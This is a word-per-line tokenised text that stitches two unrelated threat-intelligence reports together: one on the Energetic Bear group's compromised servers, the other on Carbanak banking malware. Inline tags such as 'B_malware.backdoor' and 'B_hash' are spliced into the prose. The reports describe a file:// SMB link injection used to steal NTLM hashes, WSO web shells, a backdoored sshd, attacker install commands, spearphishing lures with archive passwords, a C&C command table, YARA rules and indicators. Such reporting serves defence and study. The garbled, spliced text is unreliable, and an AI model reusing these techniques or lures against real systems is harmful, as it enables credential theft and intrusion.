actor
to
the
Russian
government
,
as
well
as
an
advisory
by
the
UK
National
Cyber
Security
Centre
.

This
report
by
Kaspersky
Lab
ICS
CERT
presents
information
on
identified
servers
that
have
been
infected
and
used
by
the
group
.

The
report
also
includes
the
findings
of
an
analysis
of
several
webservers
compromised
by
the
Energetic
Bear
group
during
2016
and
in
early
2017
.

Attack
victims

Attack
victims

The
table
below
shows
the
distribution
of
compromised
servers
(
based
on
the
language
of
website
content
and/or
the
origins
of
the
company
renting
the
server
at
the
time
of
compromise
)
by
countries
,
attacked
company
types
and
the
role
of
each
server
in
the
overall
attack
scheme
.

Victims
of
the
threat
actor's
attacks
were
not
limited
to
industrial
companies
.

Table
1
.
Compromised
servers

Country

Description

Role
in
the
attack

Opposition
political
website

Waterhole B_malware.infosteal

Real
estate
agency

Football
club

Developer
and
integrator
of
secure
automation
systems
and
IS
consultant

Developers
of
software
and
equipment

Investment
website

Electric
power
sector
company

Bank

Aerospace
company

Software
developer
and
integrator

Unknown

Auxiliary
(
collecting
user
data
in
the
Waterhole B_malware.infosteal
attack
)

Waterhole B_malware.infosteal

Waterhole B_malware.infosteal

Auxiliary
(
collecting
user
data
in
the
Waterhole B_malware.infosteal
attack
,
tool
hosting
)

Auxiliary
(
collecting
user
data
in
the
Waterhole B_malware.infosteal
attack
)

Waterhole B_malware.infosteal

Waterhole B_malware.infosteal

Waterhole B_malware.infosteal

Waterhole B_malware.infosteal

Auxiliary
(
collecting
user
data
in
the
Waterhole B_malware.infosteal
attack
)

Russia

Ukraine

UK

Germany

Oil
and
gas
sector
enterprise

Waterhole B_malware.infosteal

Turkey

Greece

USA

Industrial
group

Investment
group

Server
of
a
university

Waterhole B_malware.infosteal

Waterhole B_malware.infosteal

Auxiliary
(
collecting
user
data
in
the
Waterhole B_malware.infosteal
attack
)

Oil
and
gas
sector
enterprise

Waterhole B_malware.infosteal

Unknown

Affiliate
network
site

Auxiliary
(
collecting
user
data
in
the
Waterhole B_malware.infosteal
attack
)

Waterhole B_malware.infosteal

All
Waterhole B_malware.infosteal
servers
are
infected
following
the
same
pattern
:
injecting
a
link
into
a
web
page
or
JS
file
with
the
following
file
scheme
:
file://IP/filename.png
.

Injected
link
with
the
file
scheme

Injected
link
with
the
file
scheme

The
link
is
used
to
initiate
a
request
for
an
image
,
as
a
result
of
which
the
user
connects
to
the
remote
server
over
the
SMB
protocol
.

In
this
attack
type
,
the
attackers
'
goal
is
to
extract
the
following
data
from
the
session
:

user
IP
,

user
name
,

domain
name
,

NTLM
hash
of
the
user's
password
.

It
should
be
noted
that
the
image
requested
using
the
link
is
not
physically
located
on
the
remote
server
.

Scanned
resources

Compromised
servers
are
in
some
cases
used
to
conduct
attacks
on
other
resources
.

In
the
process
of
analyzing
infected
servers
,
numerous
websites
and
servers
were
identified
that
the
attackers
had
scanned
with
various
tools
,
such
as
nmap
,
dirsearch
,
sqlmap
,
etc
.

(
tool
descriptions
are
provided
below
)
.

Table
2
.

Resources
that
were
scanned
from
one
of
the
infected
servers

Country
(
based
on
the
content
)

Description

Non-profit
organization

Sale
of
drugs

Travel
/
maps

Resources
based
on
the
Bump
platform
(
platform
for
corporate
social
networks
)
–
non-profit
organization
,
social
network
for
college
/
university
alumni
,
communication
platform
for
NGOs
,
etc
.

Business
–
photographic
studio

Industrial
enterprise
,
construction
company

Door
manufacturing

Russia

Brazil

Turkey

Georgia

Kazakhstan

Cryptocurrency
exchange

Construction
information
and
analysis
portal

Personal
website
of
a
developer

Vainah
Telecom
IPs
and
Subnets
(
Chechen
Republic
)
Various
Chechen
resources
(
governmental
organizations
,
universities
,
industrial
enterprises
,
etc
.
)

Web
server
with
numerous
sites
(
alumni
sites
,
sites
of
industrial
and
engineering
companies
,
etc
.
)

Muslim
dating
site

Water
treatment

Hotels

Embassy
in
Turkey

Software
developer

Airport
website

City
council
website

Cosmetics
manufacturer

Religious
website

Trktelekom
subnet
with
a
large
number
of
sites

Telnet
Telecom
subnet
with
a
large
number
of
sites

Personal
website
of
a
journalist

Unknown
web
server

Office
supplies
online
store

Floral
business

Image
hosting
service

Online
course
on
sales

Dealer
of
farming
equipment
and
spare
parts

Ukrainian
civil
servant's
personal
website

Online
store
of
parts
for
household
appliance
repair

Ukraine

Timber
sales
,
construction

Tennis
club
website

Online
store
for
farmers

Online
store
of
massage
equipment

Online
clothes
store

Website
development
and
promotion

Online
air
conditioner
store

Analytical
company

Web
server
with
many
domains

Web
server
with
many
domains

Unknown
server

Flight
tracker

Switzerland

US

France

Vietnam

International

The
sites
and
servers
on
this
list
do
not
seem
to
have
anything
in
common
.

Even
though
the
scanned
servers
do
not
necessarily
look
like
potential
final
victims
,
it
is
likely
that
the
attackers
scanned
different
resources
to
find
a
server
that
could
be
used
to
establish
a
foothold
for
hosting
the
attackers
'
tools
and
,
subsequently
,
to
develop
the
attack
.

Part
of
the
sites
scanned
may
have
been
of
interest
to
the
attackers
as
candidates
for
hosting
Waterhole B_malware.infosteal
resources
.

In
some
cases
,
the
domains
scanned
were
hosted
on
the
same
server;
sometimes
the
attackers
went
through
the
list
of
possible
domains
matching
a
given
IP
.

In
most
cases
,
multiple
attempts
to
compromise
a
specific
target
were
not
identified
–
with
the
possible
exception
of
sites
on
the
Bump
platform
,
flight
tracker
servers
and
servers
of
a
Turkish
hotel
chain
.

Curiously
,
the
sites
scanned
included
a
web
developer's
website
,
kashey.ru
,
and
resources
links
to
which
were
found
on
this
site
.

These
may
have
been
links
to
resources
developed
by
the
site's
owner
:
www.esodedi.ru  B_url.unknown
,
www.i-stroy.ru  B_url.unknown
,
www.saledoor.ru B_url.unknown

Toolset
used

Utilities

Utilities
found
on
compromised
servers
are
open-source
and
publicly
available
on
GitHub
:

Nmap
–
an
open-source
utility
for
analyzing
the
network
and
verifying
its
security
.

Dirsearch
—
a
simple
command-line
tool
for
brute
forcing
(
performing
exhaustive
searches
of
)
directories
and
files
on
websites
.

Sqlmap
—
an
open-source
penetration
testing
tool
,
which
automates
the
process
of
identifying
and
exploiting
SQL
injection
vulnerabilities
and
taking
over
database
servers
.

Sublist3r
—
a
tool
written
in
Python
designed
to
enumerate
website
subdomains
.

The
tool
uses
open-source
intelligence
(
OSINT
)
.

Sublist3r
supports
many
different
search
engines
,
such
as
Google
,
Yahoo
,
Bing
,
Baidu
and
Ask
,
as
well
as
such
services
as
Netcraft
,
Virustotal
,
ThreatCrowd
,

DNSdumpster
and
ReverseDNS
.

The
tool
helps
penetration
testers
to
collect
information
on
the
subdomains
of
the
domain
they
are
researching
.

Wpscan
—
a
WordPress
vulnerability
scanner
that
uses
the
blackbox
principle
,
i.e.
,
works
without
access
to
the
source
code
.

It
can
be
used
to
scan
remote
WordPress
sites
in
search
of
security
issues
.

Impacket
—
a
toolset
for
working
with
various
network
protocols
,
which
is
required
by
SMBT
rap
.

SMBT
rap
—
a
tool
for
logging
data
received
over
the
SMB
protocol
(
user
IP
address
,
user
name
,
domain
name
,
password
NT
LM
hash
)
.

Commix
—
a
vulnerability
search
and
command
injection
and
exploitation
tool
written
in
Python
.

Subbrute
–
a
subdomain
enumeration
tool
available
for
Python
and
Windows
that
uses
an
open
name
resolver
as
a
proxy
and
does
not
send
traffic
to
the
target
DNS
server
.

PHPMailer
–
a
mail
sending
tool
.

In
addition
,
a
custom
Python
script
named
ftpChecker.py
was
found
on
one
of
the
servers
.

The
script
was
designed
to
check
FTP
hosts
from
an
incoming
list
.

Malicious
php
files

The
following
malicious
php
files
were
found
in
different
directories
in
the
nginx
folder
and
in
a
working
directory
created
by
the
attackers
on
an
infected
web
servers
:

File
name

Brief

description

Time
of
the

md5sum

latest
file

Size
,
bytes

change
(
MSK
)

ini.php

wso B_malware.backdoor
shell I
mail

mysql.php

wso B_malware.backdoor
shell I
mail

opts.php

wso B_malware.backdoor
shell I

error_
log.php

wso B_malware.backdoor
shell I

code29.php

web B_malware.backdoor
shell I

proxy87
.php

web B_malware.backdoor
shell I

theme.php

wso B_malware.backdoor
shell I

sma.php

PHPMailer

media.php

wso B_malware.backdoor
shell I

f3e3e25a822012023c6e81b206711865  B_hash

f3e3e25a822012023c6e81b206711865  B_hash

c76470e85b7f3da46539b40e5c552712  B_hash

155385cc19e3092765bcfed034b82ccb  B_hash

1644af9b6424e8f58f39c7fa5e76de51  B_hash

1644af9b6424e8f58f39c7fa5e76de51  B_hash

2292f5db385068e161ae277531b2e114  B_hash

7ec514bbdc6dd8f606f803d39af8883f  B_hash

78c31eff38fdb72ea3b1800ea917940f  B_hash

2016-07-01
15:57:38

2016-06-12
13:35:30

2016-06-12
12:23:28

2016-06-12
10:59:39

2016-06-12
11:10:40

2016-06-12
14:31:13

2017-05-16
17:33:02

2017-05-19
13:53:53

2017-04-17
15:58:41

28786

28786

36623

36636

10724

10724

133104

14696

1762986

In
the
table
above
:

web B_malware.backdoor
shell I
is
a
script
that
allows
remote
administration
of
the
machine
.

wso B_malware.backdoor
is
a
popular
web B_malware.backdoor
shell I
and
file
manager
(
it
stands
for
'
web B_malware.backdoor
shell I
by
Orb
'
)
that
has
the
ability
to
masquerade
as
an
error
page
containing
a
hidden
login
form
.

It
is
available
on
GitHub
:

https://github.com/wso-shell/WSO  B_url.normal

Two
of
the
PHP
scripts
found
,
ini.php
and
mysql.php
,
contained
a
wso B_malware.backdoor
shell I
concatenated
with
the
following
email
spamming
script
:
https://github.com/bediger4000/php-malware-analysis/tree/master/db-config.php  B_url.normal

All
the
scripts
found
are
obfuscated
.

wso B_malware.backdoor
shell I
–
error_log.php

Deobfuscated
wso B_malware.backdoor
shell I
–
error_log.php

Deobfuscated
wso B_malware.backdoor
shell I
–
error_log.php

One
of
the
web B_malware.backdoor
shell I
was
found
on
the
server
under
two
different
names
(
proxy87
.php
and
code29.php
)
.

It
uses
the
eval
function
to
execute
a
command
sent
via
HT
T
P
cookies
or
a
POST
request
:

Web B_malware.backdoor
shell I
–
proxy87.php

web B_malware.backdoor
shell I
–
proxy87.php

Deobfuscated
web B_malware.backdoor
shell I
–
proxy87.php

Deobfuscated
web B_malware.backdoor
shell I
–
proxy87.php

Modified
sshd

Modified
sshd

A
modified
sshd
with
a
preinstalled
backdoor
was
found
in
the
process
of
analyzing
the
server
.

Patches
with
some
versions
of
backdoors
for
sshd
that
are
similar
to
the
backdoor
found
are
available
on
GitHub
,
for
example
:
https://github.com/jivoi/openssh-backdoor-kit B_url.normal

Compilation
is
possible
on
any
OS
with
binary
compatibility
.

As
a
result
of
replacing
the
original
sshd
file
with
a
modified
one
on
the
infected
server
,
an
attacker
can
use
a
'
master
password
'

to
get
authorized
on
the
remote
server
,
while
leaving
minimal
traces
(
compared
to
an
ordinary
user
connecting
via
ssh
)
.

In
addition
,
the
modified
sshd
logs
all
legitimate
ssh
connections
(
this
does
not
apply
to
the
connection
that
uses
the
'
master
password
'
)
,
including
connection
times
,
account
names
and
passwords
.

The
log
is
encrypted
and
is
located
at
/var/tmp/.pipe.sock
.

Decrypted
log
at
/var/tmp/.pipe.sock

Decrypted
log
at
/var/tmp/.pipe.sock

Activity
of
the
attackers
on
compromised
servers
compromised
servers

In
addition
to
using
compromised
servers
to
scan
numerous
resources
,
other
attacker
activity
was
also
identified
.

After
gaining
access
to
the
server
,
the
attackers
installed
the
tools
they
needed
at
different
times
.

Specifically
,
the
following
commands
for
third-party
installations
were
identified
on
one
of
the
servers
:

apt
install
traceroute

apt-get
install
nmap

apt-get
install
screen

git
clone
https://github.com/sqlmapproject/sqlmap.git B_url.normal

Additionally
,
the
attackers
installed
any
packages
and
tools
for
Python
they
needed
.

The
diagram
below
shows
times
of
illegitimate
logons
to
one
of
the
compromised
servers
during
one
month
.

The
attackers
checked
the
smbtrap
log
file
on
working
days
.

In
most
cases
,
they
logged
on
to
the
server
at
roughly
the
same
time
of
day
,
probably
in
the
morning
hours
:

Times
of
illegitimate
connections
with
the
server
(
GMT+3
)

In
addition
,
in
the
process
of
performing
the
analysis
,
an
active
process
was
identified
that
exploited
SQL
injection
and
collected
data
from
a
database
of
one
of
the
victims
.

Conclusion

The
findings
of
the
analysis
of
compromised
servers
and
the
attackers
'
activity
on
these
servers
are
as
follows
:

1
.

With
rare
exceptions
,
the
group's
members
get
by
with
publicly
available
tools
.

The
use
of
publicly
available
utilities
by
the
group
to
conduct
its
attacks
renders
the
task
of
attack
attribution
without
any
additional
group
'
markers
'
very
difficult
.

2
.

Potentially
,
any
vulnerable
server
on
the
internet
is
of
interest
to
the
attackers
when
they
want
to
establish
a
foothold
in
order
to
develop
further
attacks
against
target
facilities
.

3
.

In
most
cases
that
we
have
observed
,
the
group
performed
tasks
related
to
searching
for
vulnerabilities
,
gaining
persistence
on
various
hosts
,
and
stealing
authentication
data
.

4
.

T
he
diversity
of
victims
may
indicate
the
diversity
of
the
attackers
'
interests
.

5
.

It
can
be
assumed
with
some
degree
of
certainty
that
the
group
operates
in
the
interests
of
or
takes
orders
from
customers
that
are
external
to
it
,
performing
initial
data
collection
,
the
theft
of
authentication
data
and
gaining
persistence
on
resources
that
are
suitable
for
the
attack's
further
development
.

Appendix  B_hash
I I
–
Indicators
of
Compromise

Filenames
and
Paths

Tools*

/usr/lib/libng/ftpChecker.py
/usr/bin/nmap/
/usr/lib/libng/dirsearch/
/usr/share/python2.7
/dirsearch/
/usr/lib/libng/SMBT
rap/
/usr/lib/libng/commix/
/usr/lib/libng/subbrute-master/
/usr/share/python2.7
/sqlmap/
/usr/lib/libng/sqlmap-dev/
/usr/lib/libng/wpscan/
/usr/share/python2.7
/wpscan/
/usr/share/python2.7
/Sublist3r/

*Note
that
these
tools
can
also
be
used
by
other
threat
actors
.

PHP
files
:

/usr/share/python2.7
/sma.php
/usr/share/python2.7
/theme.php
/root/theme.php
/usr/lib/libng/media.php

Logs

/var/tmp/.pipe.sock

PHP
file
hashes

f3e3e25a822012023c6e81b206711865  B_hash
c76470e85b7f3da46539b40e5c552712  B_hash
155385cc19e3092765bcfed034b82ccb  B_hash
1644af9b6424e8f58f39c7fa5e76de51  B_hash
2292f5db385068e161ae277531b2e114  B_hash
7ec514bbdc6dd8f606f803d39af8883f  B_hash
78c31eff38fdb72ea3b1800ea917940f  B_hash

Yara
rules

rule
Backdoored_
ssh
{
strings
:
$a1
=
'
OpenSSH
'
$a2
=
'
usage
:
ssh
'
$a3
=
'
HIST
FILE
'

condition
:
uint32(0
)
==
0x464c457
f
and
filesize<1000000
and
all
of
(
$a*
)

Appendix
II
–
Shell
script
to
check
a
server
for
tools

Shell
script
for
Debian

cd
/tmp
workdir=428c5fcf495396df04a459e317b70ca2
mkdir
$workdir
cd
$workdir
find
/
-type
d
-iname
smbtrap
>
find-smbtrap.txt
2>/dev/null
find
/
-type
d
-iname
dirsearch
>
find-dirsearch.txt
2>/dev/null
find
/
-type
d
-iname
nmap
>
find-nmap.txt
2>/dev/null
find
/
-type
d
-iname
wpscan
>
find-wpscan.txt
2>/dev/null
find
/
-type
d
-iname
sublist3r
>
find-sublist3r.txt
2>/dev/null
dpkg
-l
|
grep
-E
\(impacket\|pcapy\|nmap\
)
>
dpkg-grep.txt
cp
/var/lib/dpkg/info/openssh-server.md5sums
.

#retrieve
initial
hash
for
sshd
md5sum
/usr/sbin/sshd
>
sshd.md5sum
#calculate
actual
hash
for
sshd

Shell
script
for
Centos

Shell
script
for
Centos
cd
/tmp
workdir=428c5fcf495396df04a459e317
b7
0ca2
mkdir
$workdir
cd
$workdir
find
/
-type
d
-iname
smbtrap
>
find-smbtrap.txt
2>/dev/null
find
/
-type
d
-iname
dirsearch
>
find-dirsearch.txt
2>/dev/null
find
/
-type
d
-iname
nmap
>
find-nmap.txt
2>/dev/null
find
/
-type
d
-iname
wpscan
>
find-wpscan.txt
2>/dev/null

find
/
-type
d
-iname
sublist3r
>
find-sublist3r.txt
2>/dev/null
rpm
-qa
|
grep
-E
\(impacket\|pcapy\|nmap\
)
>
rpm-grep.txt
rpm
-qa
–dump
|
grep
ssh
>
rpm-qa-dump.txt
#retrieve
initial
hash
for
sshd
sha256sum
/usr/sbin/sshd
>
sshd.sha256sum
#calculate
actual
sha256
hash
for
sshd
md5sum
/usr/sbin/sshd
>
sshd.md5sum
#calculate
actual
md5
hash
for
sshd

Energetic
Bear
/
Crouching
Yeti
:
attacks
on
servers

Energetic
Bear
/
Crouching
Yeti
:
attacks
on
servers

APT
CRIMINAL

BACKDOOR

HACKERS
ATTACKS

TARGETED
ATTACK

VULNERABILITIES
AND
EXPLOITS

WATERING
HOLE
ATTACKS

Share
post
on
:




Related
Posts

APT
Trends
report
Q1
2018

Operation
Parliament
,
who
is
doing
what
?

Masha
and
these
Bears

LEAVE
A
REPLY

Your
email
address
will
not
be
published
.

Required
fields
are
marked
*

Enter
your
comment
here

Name
*

Email
*

Notify
me
when
new
comments
are
added
.

SUBMIT

reCAPTCHA

Please
upgrade
to
a
supported
browser
to
get
a
reCAPTCHA
challenge
.

Alternatively
if
you
think
you
are
getting
this
page
in
error
,
please
check
your
internet
connection
and
reload
.

Why
is
this
happening
to
me
?

©
2018
AO
Kaspe
rsky
Lab
.

All
Rights
Reserved
.

Registered
trade
marks
and
service
marks
are
the
property
of
the
ir
respective
owners
.

Email

SUBSCRIBE

Contact
us
|
Privacy
Policy
|
License
Agreement
Carbanak  B_malware.infosteal
gang
is
back
and
packing
new
guns
www.welivesecurity.com/2015/09/08/carbanak-gang-is-back-and-packing-new-guns/ B_url.normal

By
Anton
Cherepanov
posted
8
Sep
2015
-
10:49AM

The
Carbanak  B_malware.infosteal
financial
APT
group
made
the
headlines
when
Group-IB
and
Fox-IT
broke
the
news
in
December
2014
,
followed
by
the
Kaspersky
report
in
February
2015
.

The
two
reports
describe
the
same
cybercriminal
gang
which
stole
up
to
several
hundreds
of
millions
of
dollars
from
various
financial
institutions
.

However
,
the
story
is
interesting
not
only
because
of
the
large
amount
of
money
stolen
but
also
from
a
technical
point
of
view
.

The
Carbanak  B_malware.infosteal
team
does
not
just
blindly
compromise
large
numbers
of
computers
and
try
to
'
milk
the
cow
'
as
other
actors
do
,
instead
they
act
like
a
mature
APT-group
.

They
only
compromise
specific
high-value
targets
and
once
inside
the
company
networks
,
move
laterally
to
hosts
that
can
be
monetized
.

A
few
days
ago
CSIS
published
details
about
new
Carbanak  B_malware.infosteal
samples
found
in
the
wild
.

In
this
blog
we
will
describe
the
latest
developments
in
the
Carbanak B_malware.infosteal
story
.

1/15

Casino
hotel
hack

At
the
end
of
August
,
we
detected
an
attempt
to
compromise
the
network
of
a
casino
hotel
in
the
USA
.

The
infection
vector
used
in
this
attack
may
have
been
a
spearphishing
e-mail
with
a
malicious
attachment
using
an
RTF-exploit
or
.SCR
file
.

The
attackers
'
aim
was
to
compromise
PoS
servers
used
in
payment
processing
.

The
main
backdoor
used
by
attackers
was
the
open-source
Tiny  B_malware.backdoor
Meterpreter I
.

In
this
case
,
however
,
the
source
was
modified
–
the
process
injection
to
svchost.exe
was
added
to
its
functionality
.

This
Tiny  B_malware.backdoor
Meterpreter I
backdoor
dropped
two
different
malware
families
:

Win32/Spy.Sekur
–
well
known
malware
used
by
the
Carbanak  B_malware.infosteal
gang

Win32/Wemosis B_malware.backdoor
–
a
PoS
RAM
Scraper
backdoor

As
mentioned
here
by
our
colleagues
from
TrendMicro
,
Carbanak B_malware.infosteal
malware
is
capable
of
targeting
Epicor/NSB
PoS
systems
,
while
Win32/Wemosis B_malware.backdoor
is
a
general-purpose
PoS
RAM
Scraper
which
targets
any
PoS
that
stores
card
data
in
the
memory
.

The
Wemosis B_malware.backdoor
backdoor
is
written
in
Delphi
and
allows
the
attacker
to
control
an
infected
computer
remotely
.

Both
executables
were
digitally
signed
with
the
same
certificate
:

2/15

The
certificate
details
:

Company
name
:
Blik

Validity
:
from
02
October
2014
to
03
October
2015

Thumbprint
:
0d0971b6735265b28f39c1f015518768e375e2a3

Serial
number
:
00d95d2caa093bf43a029f7e2916eae7fb

Subject
:
CN
=
Blik

O
=
Blik

STREET
=
Berzarina
,
7
,
1

L
=
Moscow

S
=
Moscow

PostalCode
=
123298

C
=
RU

This
certificate
was
also
used
in
the
digital
signature
of
a
third
malware
family
used
by
the
same
gang
:
Win32/Spy.Agent.ORM B_malware.infosteal
.

Win32/Spy.Agent.ORM B_malware.infosteal
–
overview

Win32/Spy.Agent.ORM B_malware.infosteal
(
also
known
as
Win32/Toshliph
)
is
a
trojan
used
as
one
of
their
first-stage
payloads
by
the
Carbanak B_malware.infosteal
gang
.

The
binary
of
the
testing
version
was
signed
with
a
Blik
certificate
:
moreover
,
Spy.Agent.ORM
shares
some
similarities
in
the
code
with
'
the
regular
'
Carbanak B_malware.infosteal
malware
.

3/15

The
Win32/Spy.Agent.ORM B_malware.infosteal
malware
family
is
already
known
in
the
industry
because
of
two
blogposts
.

In
July
2015
security
company
Cyphort
reported
the
compromise
of
a
news
portal
and
a
banking
site
–
rbc.ua
and
unicredit.ua
.

It
turns
out
that
the
compromised
sites
served
Win32/Spy.Agent.ORM B_malware.infosteal
.

After
that
,
Blue
Coat
reported
a
spearphishing
attempt
targeting
Central
Bank
of
Armenia
employees
,
the
payload
being
the
same
.

This
malware
appeared
on
our
radar
at
the
beginning
of
summer
2015
,
and
afterwards
we
started
to
track
it
.

We
have
seen
attempts
to
attack
various
companies
in
Russia
and
Ukraine
using
spearphishing
e-mails
that
have
malicious
attachments
consisting
of
.SCR
files
or
.RTF
exploits
.

Here
is
an
example
of
a
spearphishing
email
sent
to
one
of
the
biggest
Forex-trading
companies
:

Roughly
translated
from
Russian
to
English
,
it
says
:

'
Due
to
the
high
volatility
of
the
ruble
exchange
rate
the
Bank
of
Russia
sends
rules
of
trading
on
the
currency
market
.

Password
the
attached
document
:
cbr
'

4/15

Here
is
another
example
of
a
spear
phishing
attempt
.

Email
with
this
text
was
sent
to
the
largest
electronic
payment
service
in
Russia
:

Постановлением
Роскомнадзора
от
04.08.2015г
.

Вам
необходимо
заблокировать
материалы
попадающие
под
Федеральный
закон
от
27.07.2006
N
152-ФЗ
(
ред
.
от
21.07.2014
)
'
О
персональных
данных
'
.

Перечень
материалов
в
документе
.

Пароль
roscomnadzor

Another
rough
translation
from
Russian
to
English
:

'
According
to
Roscomnadzor
prescript
you
should
block
the
materials
,
which
you
can
find
in
the
attachment
.

Password
is
roscomnadzor
'

We
have
seen
similar
.SCR
files
with
following
filenames
:

АО
'
АЛЬФА-БАНК
'
ДОГОВОР.scr
(
Alfabank
contract
)

Перечень
материалов
для
блокировки
от
04.08.2015г.scr
(
List
to
block
)

Postanovlene_ob_ustranenii_18.08.2015.pdf
%LOTS_OF_SPACES%
..scr

Правила
Банка
России
от
06.08.2015.pdf
%LOTS_OF_SPACES%
.scr
(
Rules
of
Bank
of
Russia
)

All
these
attachments
contained
a
password
protected
archive
with
.SCR
file
.

The
files
had
Adobe
Acrobat
reader
icon
or
MS
Word
icons
.

In
other
cases
attackers
used
RTF
files
with
different
exploits
,
including
an
exploit
for
one
of
the
latest
Microsoft
Office
vulnerabilities
,
CVE-2015-1770
,
which
was
patched
by
Microsoft
in
June
2015
in
MS15-059
.

We
have
seen
RTF
files
with
the
following
names
used
in
attacks
:

prikaz-451.doc

REMITTANCE
ADVICE
ON
REJECTION.doc

PROOF
OF
REMITTANCE
ADVICE
.doc

HDHS739_230715_010711_A17C7148_INTERNAL.doc

Բանկերի
եւ
բանկային
գործունեության
մասին
ՀՀ
օրենք
27.07.2015.doc
(
Armenian
:
The
Law
on
Banks
and
Banking
27.07.2015
)

PAYMENT
DETAILS.doc

5/15

АО
'
АЛЬФА-БАНК
'
ДОГОВОР.doc
(
Russian
:
Alpha-bank
contract
)

AML
REPORTS_20082015_APPLICATION
FORM-USD-MR
VYDIAR.doc

Anti-Money
Laudering
&
Suspicious
cases.doc

ApplicationXformXUSDXduplicateXpayment.doc

AML
USD
&
Suspicious
cases.doc

Amendment
inquiry
(
reference
TF1518869100.doc

Information
2.doc

Here
is
example
of
a
spearphishing
message
that
was
sent
to
a
bank
in
the
United
Arab
Emirates
:

Here
is
example
of
a
spearphishing
email
that
was
sent
to
a
German
bank
:

6/15

Win32/Spy.Agent.ORM B_malware.infosteal
–
Technical
details

Win32/Spy.Agent.ORM B_malware.infosteal
is
a
small
and
simple
backdoor
that
enables
the
attackers
to
assess
the
victim
.

When
executed
the
trojan
connects
to
a
C&C
server
and
receives
commands
to
grab
screenshots
,
enumerate
running
processes
and
get
information
about
the
system
and
campaign
ID
.

Based
on
that
information
malware
operator
decides
whether
the
infected
computer
is
useful
:
that
is
,
whether
it's
the
intended
target
or
just
a
system
that
was
accidentally
infected
.

Here
is
list
of
commands
that
it
can
receive
from
C&C
server
:

Command
Purpose

7/15

0x02
0x03
0x04
0x05
0x06
0x07
0x08

Collects
information
about
computer
:
Computer
Name
,
User
Name
,

Windows
Version
,
Architecture
(
32/64
bit
)
and
campaign
ID

Collects
list
of
running
processes

Downloads
binary
to
%TEMP%
and
executes

Updates
itself

Deletes
itself

Makes
screenshot

Loads
binary
in
the
memory
,
without
dropping
to
the
disk

The
latest
sample
of
this
malware
family
found
in
the
wild
is
also
digitally
signed
with
a
different
certificate
:

The
certificate
details
:

Company
name
:
In
travel
TOV

8/15

Validity
:
from
21
July
2015
to
21
July
2016

Thumbprint
:
7809fbd8d24949124283b9ff14d12da497d9c724

Serial
number
:
00dfd915e32c5f3181a0cdf0aff50f8052

Subject
:
CN
=
In
travel
TOV

O
=
In
travel
TOV

STREET
=
prospekt
Pravdi
33

L
=
Kiev

S
=
Kievskaja

PostalCode
=
04108

C
=
UA

Also
,
the
latest
sample
is
able
to
gain
system
privileges
via
an
exploit
and
install
itself
as
a
system
service
.

The
trojan
attempts
to
exploit
a
vulnerability
–
CVE-2015-2426
in
the
OpenType
manager
module
(
ATMFD.dll
)
–
which
was
patched
by
Microsoft
in
MS15-078
.

The
exploit
for
this
vulnerability
was
leaked
in
a
Hacking
Team
dump
.

The
digital
certificate
for
Blik
used
in
this
case
is
not
the
only
link
between
Win32/Spy.Agent.ORM B_malware.infosteal
and
Win32/Spy.Sekur
(
Carbanak B_malware.infosteal
malware
)
.

They
share
similarities
in
code
–
take
a
look
at
the
function
that
generates
the
BOTID-value
,
for
example
:

9/15

The
BOTID-value
is
a
unique
value
generated
on
the
basis
of
the
hardware
parameters
of
infected
computer
,
and
it's
used
by
attackers
for
computer
identification
.

In
both
cases
generation
is
based
on
the
MAC-address
and
computer
name
and
the
resulting
value
is
formatted
using
the
wsprintf
–function
.

Sinkhole
statistics

10/15

Our
sinkhole
of
some
C&C
domains
used
by
the
Win32/Wemosis B_malware.backdoor
has
resulted
in
hits
from
bots
in
the
following
countries
.

As
the
attacks
are
highly
targeted
,
the
total
number
of
victims
is
low
in
absolute
numbers
.

Victims
in
the
USA
are
situated
in
several
states
,
including
Nevada
(
Las
Vegas
)
,

California
,
and
New
York
,
and
include
casinos
and
hotels
.

Conclusions

Even
after
it
has
reportedly
stolen
hundreds
of
millions
of
dollars
,
the
infamous
Carbanak B_malware.infosteal
APT
group
isn't
resting
on
its
laurels
.

On
the
contrary
,
it
is
very
active
and
keeps
attacking
specific
targets
related
to
the
finance
industry
,
including
banks
,
Forex-trading
companies
,
and
even
an
American
casino
hotel
.

Recently
,
we
have
detected
malware
used
by
the
Carbanak B_malware.infosteal
group
in
the
following
countries
,
among
others
:

United
States
of
America

Germany

United
Arab
Emirates

11/15

As
described
in
this
blog
post
,
the
gang
doesn't
use
just
one
malware
family
to
carry
out
its
operations
but
several
.

While
the
code
in
the
different
families
–
Carbanak B_malware.infosteal
(
Win32/Spy.Sekur
)
,
Win32/Spy.Agent.ORM B_malware.infosteal
,
and
Win32/Wemosis B_malware.backdoor
–
is
different
it
does
contain
similar
traits
,
including
the
same
digital
certificate
.

Furthermore
,
the
attackers
are
updating
their
arsenal
with
the
latest
exploits
,
such
as
the

Microsoft
Office
remote
code
execution
vulnerability
,
CVE-2015-1770
,
or
the
zero-day
exploit
leaked
in
the
Hacking
Team
dumps
,
CVE-2015-2426
.

We
continue
to
monitor
the
Carbanak B_malware.infosteal
threats
.
For
any
enquiries
or
sample
submissions
related
to
the
subject
,
contact
as
at
:
threatintel@eset.com
.

Indicators
of
Compromise
(
IoC
)

Trojan.Win32/Spy.Sekur
(
Carbanak B_malware.infosteal
malware
)
SHA-1
:

A048C093C5DA06AF148CA75299960F618F878B3A  B_hash
3552338D471B7A406D8F7E264E93B848075235C0  B_hash
3A9A23C01393A4046A5F38FDBAC371D5D4A282F1  B_hash
8D5F2BF805A9047D58309788A3C9E8DE395469A8  B_hash
BCF9E4DCE910E94739728158C98578A8D145BE56  B_hash
8330BC5A3DCC52A22E50187080A60D6DBF23E7E6  B_hash
E838004A216E58C44553A168760100B497E514E8  B_hash
CF1F97879A6EB26FEDC7207D6679DFA221DD2D45  B_hash
7267791340204020727923CC7C8D65AFC18F6F5B  B_hash
F8CBF647A64028CAE835A750EF3F8D1AA216E46C  B_hash
33870482BA7DE041587D4B809574B458C0673E94  B_hash
3927835C620058EFCADF76642489FC13AACE305B  B_hash
D678BD90257CF859C055A82B4A082F9182EB3437  B_hash
0B8605D0293D04BBF610103039768CBE62E2FAAE  B_hash
7A9BE31078BC9B5FECE94BC1A9F45B7DBF0FCE12  B_hash

RTF-exploits
SHA-1
:

D71E310ADF183F02E36B06D166F8E3AD54FDBCC9  B_hash
5B6ABA51215A9662987F59AEF6CAE0A9E3A720B8  B_hash
1AD84A244B7D4FBB4D89D023B21715B346027E49  B_hash
E8514BF4C4E1F35FB1737C2F28A4A4CED07AA649  B_hash
68EA12CDCCEE01D50C23EBC29CAA96BF40925DC6  B_hash
AC95F01487B4F179A1F10684B1E0A5656940A005  B_hash

12/15

